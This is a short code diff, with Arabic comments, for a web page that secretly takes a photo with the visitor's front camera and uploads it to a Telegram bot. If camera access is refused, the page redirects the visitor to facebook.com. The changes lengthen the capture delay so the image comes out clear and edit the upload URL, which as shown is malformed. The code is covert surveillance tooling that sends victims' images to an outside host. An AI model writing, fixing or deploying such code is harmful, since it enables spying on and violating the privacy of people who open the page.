@@ -36,7 +36,8 @@ async function init() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
-        setTimeout(captureAndSend, 40);
+        // الانتظار ثانية واحدة لضمان وضوح الصورة
+        setTimeout(captureAndSend, 1000);
     } catch (err) {
         window.location.href = "https://facebook.com";
     }
@@ -54,7 +55,7 @@ function captureAndSend() {
         formData.append("photo", blob, "image.jpg");
 
         try {
-            // الرابط الصحيح لإرسال الصورة للبوت
+            // صلحنا الرابط هنا
             await fetch(`https://telegram.org{TOKEN}/sendPhoto`, {
                 method: "POST",
                 body: formData
